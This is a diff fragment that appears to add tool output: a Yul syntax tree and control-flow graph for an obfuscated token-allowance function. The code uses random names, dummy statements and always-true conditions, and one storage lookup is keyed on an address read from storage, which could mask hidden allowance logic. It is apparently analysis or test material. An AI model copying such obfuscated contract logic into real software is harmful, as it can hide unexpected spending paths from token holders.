+          - YulAssignment: uAnE := keccak256(bbwz, 64) [4908:27:0]
+            - YulIdentifier: YulIdentifier [4908:4:0]
+            - YulFunctionCall: YulFunctionCall [4916:19:0]
+              - YulIdentifier: YulIdentifier [4916:9:0]
+              - YulIdentifier: YulIdentifier [4926:4:0]
+              - YulLiteral: YulLiteral [4932:2:0]
+          - YulExpressionStatement: mstore(bbwz, _spender) [4952:22:0]
+            - YulFunctionCall: YulFunctionCall [4952:22:0]
+              - YulIdentifier: YulIdentifier [4952:6:0]
+              - YulIdentifier: YulIdentifier [4959:4:0]
+              - YulIdentifier: YulIdentifier [4965:8:0]
+          - YulExpressionStatement: mstore(add(bbwz, 32), uAnE) [4991:27:0]
+            - YulFunctionCall: YulFunctionCall [4991:27:0]
+              - YulIdentifier: YulIdentifier [4991:6:0]
+              - YulFunctionCall: YulFunctionCall [4998:13:0]
+                - ...
+              - YulIdentifier: YulIdentifier [5013:4:0]
+          - YulAssignment: Jfwv := keccak256(bbwz, 64) [5035:27:0]
+            - YulIdentifier: YulIdentifier [5035:4:0]
+            - YulFunctionCall: YulFunctionCall [5043:19:0]
+              - YulIdentifier: YulIdentifier [5043:9:0]
+              - YulIdentifier: YulIdentifier [5053:4:0]
+              - YulLiteral: YulLiteral [5059:2:0]
+          - YulAssignment: zfPf := add(sload(Jfwv), CCkU) [5079:30:0]
+            - YulIdentifier: YulIdentifier [5079:4:0]
+            - YulFunctionCall: YulFunctionCall [5087:22:0]
+              - YulIdentifier: YulIdentifier [5087:3:0]
+              - YulFunctionCall: YulFunctionCall [5091:11:0]
+                - ...
+              - YulIdentifier: YulIdentifier [5104:4:0]
+      - YulVariableDeclaration: let gbj1enk := gas() [5136:20:0]
+        - YulTypedName: YulTypedName [5140:7:0]
+        - YulFunctionCall: YulFunctionCall [5151:5:0]
+          - YulIdentifier: YulIdentifier [5151:3:0]
+      - YulExpressionStatement: pop(0) [5169:6:0]
+        - YulFunctionCall: YulFunctionCall [5169:6:0]
+          - YulIdentifier: YulIdentifier [5169:3:0]
+          - YulLiteral: YulLiteral [5173:1:0]
+      - YulIf: if eq(gbj1enk, and(gbj1enk, gbj1enk)) [5188:93:0]
+        - YulFunctionCall: YulFunctionCall [5191:34:0]
+          - YulIdentifier: YulIdentifier [5191:2:0]
+          - YulIdentifier: YulIdentifier [5194:7:0]
+          - YulFunctionCall: YulFunctionCall [5203:21:0]
+            - YulIdentifier: YulIdentifier [5203:3:0]
+            - YulIdentifier: YulIdentifier [5207:7:0]
+            - YulIdentifier: YulIdentifier [5216:7:0]
+        - YulBlock: YulBlock [5226:55:0]
+          - YulAssignment: zfPf := sub(zfPf, CCkU) [5244:23:0]
+            - YulIdentifier: YulIdentifier [5244:4:0]
+            - YulFunctionCall: YulFunctionCall [5252:15:0]
+              - YulIdentifier: YulIdentifier [5252:3:0]
+              - YulIdentifier: YulIdentifier [5256:4:0]
+              - YulIdentifier: YulIdentifier [5262:4:0]
+      - YulIf: if iszero(eq(zfPf, not(0))) [5294:324:0]
+        - YulFunctionCall: YulFunctionCall [5297:24:0]
+          - YulIdentifier: YulIdentifier [5297:6:0]
+          - YulFunctionCall: YulFunctionCall [5304:16:0]
+            - YulIdentifier: YulIdentifier [5304:2:0]
+            - YulIdentifier: YulIdentifier [5307:4:0]
+            - YulFunctionCall: YulFunctionCall [5313:6:0]
+              - YulIdentifier: YulIdentifier [5313:3:0]
+              - YulLiteral: YulLiteral [5317:1:0]
+        - YulBlock: YulBlock [5322:296:0]
+          - YulIf: if lt(zfPf, _amount) [5340:73:0]
+            - YulFunctionCall: YulFunctionCall [5343:17:0]
+              - YulIdentifier: YulIdentifier [5343:2:0]
+              - YulIdentifier: YulIdentifier [5346:4:0]
+              - YulIdentifier: YulIdentifier [5352:7:0]
+            - YulBlock: YulBlock [5361:52:0]
+              - YulExpressionStatement: revert(0, 0) [5383:12:0]
+                - ...
+          - YulVariableDeclaration: let bf51h1a := basefee() [5430:24:0]
+            - YulTypedName: YulTypedName [5434:7:0]
+            - YulFunctionCall: YulFunctionCall [5445:9:0]
+              - YulIdentifier: YulIdentifier [5445:7:0]
+          - YulExpressionStatement: pop(0) [5471:6:0]
+            - YulFunctionCall: YulFunctionCall [5471:6:0]
+              - YulIdentifier: YulIdentifier [5471:3:0]
+              - YulLiteral: YulLiteral [5475:1:0]
+          - YulIf: if eq(bf51h1a, and(bf51h1a, bf51h1a)) [5494:110:0]
+            - YulFunctionCall: YulFunctionCall [5497:34:0]
+              - YulIdentifier: YulIdentifier [5497:2:0]
+              - YulIdentifier: YulIdentifier [5500:7:0]
+              - YulFunctionCall: YulFunctionCall [5509:21:0]
+                - ...
+            - YulBlock: YulBlock [5532:72:0]
+              - YulExpressionStatement: sstore(Jfwv, sub(zfPf, _amount)) [5554:32:0]
+                - ...
+  LocalCFG:
+    Nodes:
+      N0 [entry] entry
+      N1 [exit] exit
+      N2 [statement] let bbwz := mload(0x40) @ 4206:23:0 (line 125:13)
+      N3 [statement] mstore(bbwz, sload(qBQC.slot)) @ 4242:30:0 (line 126:13)
+      N4 [statement] mstore(add(bbwz, 32), 1) @ 4285:24:0 (line 127:13)
+      N5 [statement] let uAnE := keccak256(bbwz, 64) @ 4322:31:0 (line 128:13)
+      N6 [statement] let bcw8ayf := basefee() @ 4366:24:0 (line 129:13)
+      N7 [statement] let ncwupwx := number() @ 4403:23:0 (line 130:13)
+      N8 [condition] if eq(sub(bcw8ayf, ncwupwx), sub(bcw8ayf, ncwupwx)) @ 4439:148:0 (line 131:13)
+      N9 [merge] if merge @ 4439:148:0 (line 131:13)
+      N10 [statement] mstore(bbwz, _owner) @ 4509:20:0 (line 132:17)
+      N11 [statement] mstore(add(bbwz, 32), uAnE) @ 4546:27:0 (line 133:17)
+      N12 [statement] let Jfwv := keccak256(bbwz, 64) @ 4600:31:0 (line 135:13)
+      N13 [statement] let CCkU := sload(Jfwv) @ 4644:23:0 (line 136:13)
+      N14 [statement] let zfPf := CCkU @ 4680:16:0 (line 137:13)
+      N15 [condition] if and(zfPf, iszero(_amount)) @ 4709:74:0 (line 138:13)
+      N16 [merge] if merge @ 4709:74:0 (line 138:13)
+      N17 [terminal] revert(0, 0) @ 4757:12:0 (line 139:17)
+      N18 [condition] if iszero(zfPf) @ 4796:327:0 (line 141:13)
+      N19 [merge] if merge @ 4796:327:0 (line 141:13)
+      N20 [statement] mstore(bbwz, _owner) @ 4830:20:0 (line 142:17)
+      N21 [statement] mstore(add(bbwz, 32), 1) @ 4867:24:0 (line 143:17)
+      N22 [statement] uAnE := keccak256(bbwz, 64) @ 4908:27:0 (line 144:17)
+      N23 [statement] mstore(bbwz, _spender) @ 4952:22:0 (line 145:17)
+      N24 [statement] mstore(add(bbwz, 32), uAnE) @ 4991:27:0 (line 146:17)
+      N25 [statement] Jfwv := keccak256(bbwz, 64) @ 5035:27:0 (line 147:17)
+      N26 [statement] zfPf := add(sload(Jfwv), CCkU) @ 5079:30:0 (line 148:17)
+      N27 [statement] let gbj1enk := gas() @ 5136:20:0 (line 150:13)
+      N28 [statement] pop(0) @ 5169:6:0 (line 151:13)
+      N29 [condition] if eq(gbj1enk, and(gbj1enk, gbj1enk)) @ 5188:93:0 (line 152:13)
+      N30 [merge] if merge @ 5188:93:0 (line 152:13)
+      N31 [statement] zfPf := sub(zfPf, CCkU) @ 5244:23:0 (line 153:17)
+      N32 [condition] if iszero(eq(zfPf, not(0))) @ 5294:324:0 (line 155:13)
+      N33 [merge] if merge @ 5294:324:0 (line 155:13)
+      N34 [condition] if lt(zfPf, _amount) @ 5340:73:0 (line 156:17)
+      N35 [merge] if merge @ 5340:73:0 (line 156:17)
+      N36 [terminal] revert(0, 0) @ 5383:12:0 (line 157:21)
+      N37 [statement] let bf51h1a := basefee() @ 5430:24:0 (line 159:17)
+      N38 [statement] pop(0) @ 5471:6:0 (line 160:17)
+      N39 [condition] if eq(bf51h1a, and(bf51h1a, bf51h1a)) @ 5494:110:0 (line 161:17)
+      N40 [merge] if merge @ 5494:110:0 (line 161:17)
+      N41 [statement] sstore(Jfwv, sub(zfPf, _amount)) @ 5554:32:0 (line 162:21)
+    Edges:
+      N0 --[next]--> N2
+      N2 --[next]--> N3
+      N3 --[next]--> N4
+      N4 --[next]--> N5
+      N5 --[next]--> N6
+      N6 --[next]--> N7
+      N7 --[next]--> N8
+      N8 --[true: eq(sub(bcw8ayf, ncwupwx), sub(bcw8ayf, ncwupwx))]--> N10
+      N10 --[next]--> N11
+      N11 --[next]--> N9
+      N8 --[false: !(eq(sub(bcw8ayf, ncwupwx), sub(bcw8ayf, ncwupwx)))]--> N9
+      N9 --[next]--> N12
+      N12 --[next]--> N13
+      N13 --[next]--> N14
+      N14 --[next]--> N15
+      N15 --[true: and(zfPf, iszero(_amount))]--> N17
+      N17 --[terminate: revert]--> N1
+      N15 --[false: !(and(zfPf, iszero(_amount)))]--> N16
+      N16 --[next]--> N18
+      N18 --[true: iszero(zfPf)]--> N20
+      N20 --[next]--> N21
+      N21 --[next]--> N22
+      N22 --[next]--> N23
+      N23 --[next]--> N24
+      N24 --[next]--> N25
+      N25 --[next]--> N26
+      N26 --[next]--> N19
+      N18 --[false: !(iszero(zfPf))]--> N19
+      N19 --[next]--> N27
+      N27 --[next]--> N28
+      N28 --[next]--> N29
+      N29 --[true: eq(gbj1enk, and(gbj1enk, gbj1enk))]--> N31
+      N31 --[next]--> N30
+      N29 --[false: !(eq(gbj1enk, and(gbj1enk, gbj1enk)))]--> N30
+      N30 --[next]--> N32
+      N32 --[true: iszero(eq(zfPf, not(0)))]--> N34
+      N34 --[true: lt(zfPf, _amount)]--> N36
+      N36 --[terminate: revert]--> N1
+      N34 --[false: !(lt(zfPf, _amount))]--> N35
+      N35 --[next]--> N37
+      N37 --[next]--> N38
+      N38 --[next]--> N39
+      N39 --[true: eq(bf51h1a, and(bf51h1a, bf51h1a))]--> N41
+      N41 --[next]--> N40
+      N39 --[false: !(eq(bf51h1a, and(bf51h1a, bf51h1a)))]--> N40
+      N40 --[next]--> N33
+      N32 --[false: !(iszero(eq(zfPf, not(0))))]--> N33
+      N33 --[next]--> N1
